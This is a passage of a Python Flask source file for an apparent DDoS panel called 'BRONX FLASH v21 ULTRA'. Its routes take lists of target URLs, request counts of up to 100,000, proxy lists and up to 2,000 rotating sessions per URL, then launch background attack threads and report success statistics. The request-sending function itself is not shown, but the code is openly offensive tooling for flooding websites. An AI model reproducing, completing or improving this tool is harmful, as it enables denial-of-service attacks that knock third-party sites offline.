fetch('/pool_status').then(r=>r.json()).then(d=>{
    document.getElementById('sessionDisplay').textContent=d.pool_size;
    document.getElementById('poolSize').textContent=d.pool_size;
});
setInterval(()=>{l();u();document.getElementById('liveTime').textContent=new Date().toLocaleTimeString()},1500);
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
current_effect = "cyber"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            resp = make_response('<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>')
            return resp
        return render_template_string(LOGIN, error="Access Denied", effect=current_effect)
    return render_template_string(LOGIN, error=None, effect=current_effect)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return render_template_string(DASH, effects=EFFECTS)

@app.route('/effect/<effect>')
def set_effect(effect):
    global current_effect
    if effect in EFFECTS:
        current_effect = effect
    return jsonify({"status": "ok"})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    urls = [u.strip() for u in d.get('urls',[]) if u.strip()]
    count = min(int(d.get('count',1000)),100000)
    speed = d.get('speed','ultragod')
    mode = d.get('mode','direct')
    use_proxy = d.get('proxy',False)
    if not urls: return jsonify({"error":"URLs required"}),400
    
    aid = f"atk_{int(time.time())}"
    active_attacks[aid] = True
    attack_logs.append(f"🎯 {len(urls)} targets | {count} req | {speed.upper()} | Multi-Session")
    attack_logs.append(f"🔗 Using {multi_session_config['sessions_per_url']} sessions per URL")
    
    t = threading.Thread(target=run_attack_multi, args=(aid,urls,count,speed,mode,use_proxy))
    t.daemon=True; t.start()
    return jsonify({"status":"started","attack_id":aid})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    attack_logs.append("⏹️ All attacks terminated")
    return jsonify({"status":"stopped"})

@app.route('/reset', methods=['POST'])
def reset():
    attack_stats["success"] = 0
    attack_stats["failed"] = 0
    attack_stats["total"] = 0
    return jsonify({"status":"reset"})

@app.route('/reset_lifetime', methods=['POST'])
def reset_lifetime():
    total_lifetime["success"] = 0
    total_lifetime["failed"] = 0
    total_lifetime["total"] = 0
    return jsonify({"status":"lifetime reset"})

@app.route('/rate', methods=['POST'])
def save_rate():
    global rate_limit_config
    d = request.get_json()
    rate_limit_config = {"enabled": d.get('enabled',False), "rpm": d.get('rpm',15)}
    return jsonify({"status":"saved"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip() and ':' in p]
    return jsonify({"status":"saved","count":len(custom_proxies)})

@app.route('/multi_session', methods=['POST'])
def save_multi_session():
    global multi_session_config
    d = request.get_json()
    multi_session_config = {
        "enabled": d.get('enabled',True),
        "sessions_per_url": min(d.get('sessions_per_url',50), 2000),
        "rotating": d.get('rotating',True),
        "pool_size": min(d.get('pool_size',2000), 2000)
    }
    attack_logs.append(f"🔗 Multi-Session: {multi_session_config['sessions_per_url']}/URL | Pool: {multi_session_config['pool_size']}")
    return jsonify({"status":"saved","config":multi_session_config})

@app.route('/refresh_sessions', methods=['POST'])
def refresh_sessions():
    with session_lock:
        refresh_count = len(session_pool) // 5
        for _ in range(refresh_count):
            if session_pool:
                session_pool.pop(0)
                session_pool.append(create_session())
    attack_logs.append(f"🔄 Refreshed {refresh_count} sessions")
    return jsonify({"status":"refreshed","pool_size":len(session_pool),"active":len(active_attacks)})

@app.route('/pool_status')
def pool_status():
    return jsonify({
        "pool_size": len(session_pool),
        "max_sessions": MAX_SESSIONS,
        "active_attacks": len(active_attacks),
        "multi_session": multi_session_config
    })

@app.route('/ping')
def ping():
    return jsonify({"status":"pong","time":datetime.now().isoformat()})

@app.route('/logs')
def logs():
    return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats():
    return jsonify({
        **attack_stats,
        "lt_success": total_lifetime["success"],
        "lt_total": total_lifetime["total"],
        "active_attacks": len(active_attacks),
        "pool_size": len(session_pool),
        "multi_session": multi_session_config["enabled"]
    })

@app.route('/logout')
def logout():
    return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

# ============================================
# STARTUP
# ============================================
if __name__ == "__main__":
    print("""
    ╔══════════════════════════════════════════╗
    ║     💀 BRONX FLASH v21 ULTRA 💀         ║
    ║     ⚡ 2000 Multi-Session Engine ⚡      ║
    ║     ☠️  GOD KILLER MODE ACTIVE ☠️       ║
    ╚══════════════════════════════════════════╝
    """)
    
    # Initialize session pool
    initialize_session_pool()
    
    # Start session refresh daemon
    refresh_thread = threading.Thread(target=refresh_session_pool, daemon=True)
    refresh_thread.start()
    
    print("⚡ ULTRA GOD MODE: ENABLED")
    print(f"🔗 Session Pool: {len(session_pool)} sessions")
    print(f"🎯 Multi-Session: {multi_session_config['sessions_per_url']} per URL")
    print("🚀 Server starting...")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
